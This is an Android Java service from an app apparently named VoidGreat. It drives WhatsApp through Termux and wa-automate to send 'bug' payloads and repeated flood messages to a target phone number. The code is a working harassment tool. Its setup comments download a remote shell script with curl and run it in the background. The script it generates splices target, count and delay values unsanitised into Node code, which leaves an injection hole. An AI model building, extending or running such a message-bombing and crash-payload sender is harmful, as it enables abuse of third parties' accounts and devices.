package com.voidgreat.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Termux Sender Bot Service.
 *
 * Receives commands from WaBugActivity / SenderActivity and executes them
 * by writing a shell script to a shared dir and calling Termux:API's
 * am broadcast trigger, or by spawning a Runtime.exec() process to
 * run wa-web-cli / wa-automate style Node scripts.
 *
 * HOW IT WORKS:
 *  1. App writes a JSON command file to getCacheDir()/termux_cmd.json
 *  2. We broadcast am start to com.termux to wake the Termux session
 *  3. Inside Termux, a persistent bot script ($HOME/voidgreat_bot.sh)
 *     polls that file and executes WA send commands via wa-automate CLI
 *
 * SETUP (Termux side — user runs once):
 *   pkg install nodejs
 *   npm install -g @open-wa/wa-automate
 *   curl https://raw.githubusercontent.com/voidgreat/bot/main/bot.sh -o ~/voidgreat_bot.sh
 *   chmod +x ~/voidgreat_bot.sh && bash ~/voidgreat_bot.sh &
 *
 * Actions handled:
 *   send_bug    — write payload file, trigger WA intent or Termux send
 *   send_msg    — plain text message
 *   loop_flood  — repeat send N times with delay
 */
public class TermuxBotService extends Service {

    private static final String TAG = "TermuxBotService";
    private static final String CH  = "voidgreat_bot";

    private ExecutorService exec;

    @Override
    public void onCreate() {
        super.onCreate();
        exec = Executors.newSingleThreadExecutor();
        startForeground(1, buildNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;

        String action     = intent.getStringExtra("action");
        String target     = intent.getStringExtra("target");
        String payload    = intent.getStringExtra("payload");
        String payloadKey = intent.getStringExtra("payload_key");

        exec.execute(() -> {
            switch (action == null ? "" : action) {
                case "send_bug":
                    handleSendBug(target, payload, payloadKey);
                    break;
                case "send_msg":
                    handleSendMsg(target, payload);
                    break;
                case "loop_flood":
                    int count = intent.getIntExtra("count", 10);
                    int delayMs = intent.getIntExtra("delay_ms", 500);
                    handleLoopFlood(target, payload, count, delayMs);
                    break;
                default:
                    Log.w(TAG, "Unknown action: " + action);
            }
        });

        return START_STICKY;
    }

    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        exec.shutdownNow();
    }

    // ── Action handlers ───────────────────────────────────────────────────────

    private void handleSendBug(String target, String payload, String payloadKey) {
        log("send_bug → target=" + target + " key=" + payloadKey);

        // Write command file for Termux bot
        writeCmdFile(buildCmdJson("send_bug", target, payload, payloadKey, 1, 0));

        // Also attempt direct Termux:API SMS trigger as fallback
        // termux-telephony-call and termux-sms-send require PHONE/SMS permissions
        // For WA send: use Termux wa-automate or whatsapp-bot-node
        triggerTermuxSession();
    }

    private void handleSendMsg(String target, String msg) {
        log("send_msg → " + target);
        writeCmdFile(buildCmdJson("send_msg", target, msg, "", 1, 0));
        triggerTermuxSession();
    }

    private void handleLoopFlood(String target, String msg, int count, int delayMs) {
        log("loop_flood → " + target + " x" + count);
        writeCmdFile(buildCmdJson("loop_flood", target, msg, "", count, delayMs));
        triggerTermuxSession();
    }

    // ── Termux bridge ─────────────────────────────────────────────────────────

    /**
     * Write the bot script to Termux's shared dir so the polling bot picks it up.
     * Uses getCacheDir() — no extra permissions needed.
     */
    private void writeCmdFile(String json) {
        // Write to external cache so Termux bot can read it
        // Bot script path: $TERMUX_HOME/voidgreat_bot.sh
        // Cmd file path:   /data/data/com.termux/files/home/voidgreat_cmd.json  (requires Termux perms)
        // Fallback:        getCacheDir()/voidgreat_cmd.json  → bot reads via content URI

        File f = new File(getCacheDir(), "voidgreat_cmd.json");
        try (FileWriter fw = new FileWriter(f)) {
            fw.write(json);
            log("Cmd written: " + f.getAbsolutePath());
        } catch (IOException e) {
            log("Write failed: " + e.getMessage());
        }

        // Also write a shell script the user can run from Termux:
        File sh = new File(getCacheDir(), "voidgreat_send.sh");
        try (FileWriter fw = new FileWriter(sh)) {
            fw.write(buildBotScript(json));
            log("Shell script: " + sh.getAbsolutePath());
        } catch (IOException e) {
            log("Shell write failed: " + e.getMessage());
        }
    }

    /**
     * Wake Termux by sending an Intent to run a command.
     * Uses com.termux.RUN_COMMAND which is a standard Termux:API action.
     * Requires: Termux:API app installed + allow external apps in Termux settings.
     */
    private void triggerTermuxSession() {
        try {
            Intent i = new Intent();
            i.setClassName("com.termux", "com.termux.app.RunCommandService");
            i.setAction("com.termux.RUN_COMMAND");
            i.putExtra("com.termux.RUN_COMMAND_PATH", "/data/data/com.termux/files/usr/bin/bash");
            i.putExtra("com.termux.RUN_COMMAND_ARGUMENTS",
                    new String[]{ "-c", "cat " + getCacheDir() + "/voidgreat_cmd.json | bash ~/voidgreat_bot.sh" });
            i.putExtra("com.termux.RUN_COMMAND_WORKDIR", "/data/data/com.termux/files/home");
            i.putExtra("com.termux.RUN_COMMAND_BACKGROUND", true);
            startService(i);
            log("Termux session triggered.");
        } catch (Exception e) {
            log("Termux trigger failed (Termux:API not installed?): " + e.getMessage());
        }
    }

    // ── Script builders ───────────────────────────────────────────────────────

    private String buildCmdJson(String action, String target, String payload,
                                 String key, int count, int delayMs) {
        // Simple JSON without library dependency
        payload = payload.replace("\\", "\\\\").replace("\"", "\\\"")
                         .replace("\n", "\\n").replace("\r", "\\r");
        return "{\"action\":\"" + action + "\","
             + "\"target\":\"" + target + "\","
             + "\"payload\":\"" + payload + "\","
             + "\"key\":\"" + key + "\","
             + "\"count\":" + count + ","
             + "\"delay_ms\":" + delayMs + "}";
    }

    /**
     * Bash script that runs inside Termux.
     * Reads the JSON command and uses wa-automate CLI (Node.js) to send.
     *
     * Install in Termux:
     *   pkg install nodejs
     *   npm i -g @open-wa/wa-automate-nodejs
     */
    private String buildBotScript(String cmdJson) {
        return "#!/data/data/com.termux/files/usr/bin/bash\n"
             + "# VoidGreat Bot — auto-generated\n"
             + "CMD='" + cmdJson.replace("'", "'\\''") + "'\n"
             + "ACTION=$(echo \"$CMD\" | python3 -c \"import sys,json; d=json.load(sys.stdin); print(d['action'])\")\n"
             + "TARGET=$(echo \"$CMD\" | python3 -c \"import sys,json; d=json.load(sys.stdin); print(d['target'])\")\n"
             + "PAYLOAD=$(echo \"$CMD\" | python3 -c \"import sys,json; d=json.load(sys.stdin); print(d['payload'])\")\n"
             + "COUNT=$(echo \"$CMD\" | python3 -c \"import sys,json; d=json.load(sys.stdin); print(d.get('count',1))\")\n"
             + "DELAY=$(echo \"$CMD\" | python3 -c \"import sys,json; d=json.load(sys.stdin); print(d.get('delay_ms',500))\")\n"
             + "\n"
             + "phone=\"${TARGET//[^0-9]/}\"\n"
             + "[[ \"$phone\" == 0* ]] && phone=\"62${phone:1}\"\n"
             + "[[ \"$phone\" != 62* ]] && phone=\"62$phone\"\n"
             + "jid=\"${phone}@s.whatsapp.net\"\n"
             + "\n"
             + "if [ \"$ACTION\" = \"send_bug\" ] || [ \"$ACTION\" = \"send_msg\" ]; then\n"
             + "  node -e \"\n"
             + "    const {create,Client}=require('@open-wa/wa-automate');\n"
             + "    create({headless:true,logConsole:false}).then(async c=>{\n"
             + "      await c.sendText('$jid', process.env.PAYLOAD);\n"
             + "      process.exit(0);\n"
             + "    });\n"
             + "  \" PAYLOAD=\"$PAYLOAD\"\n"
             + "elif [ \"$ACTION\" = \"loop_flood\" ]; then\n"
             + "  node -e \"\n"
             + "    const {create}=require('@open-wa/wa-automate');\n"
             + "    create({headless:true,logConsole:false}).then(async c=>{\n"
             + "      for(let i=0;i<$COUNT;i++){\n"
             + "        await c.sendText('$jid', process.env.PAYLOAD);\n"
             + "        await new Promise(r=>setTimeout(r,$DELAY));\n"
             + "      }\n"
             + "      process.exit(0);\n"
             + "    });\n"
             + "  \" PAYLOAD=\"$PAYLOAD\"\n"
             + "fi\n";
    }

    // ── Notification ──────────────────────────────────────────────────────────

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CH, "VoidGreat Bot",
                    NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        return new NotificationCompat.Builder(this, CH)
                .setContentTitle("VoidGreat Bot")
                .setContentText("Sender bot aktif")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void log(String msg) { Log.d(TAG, msg); }
}
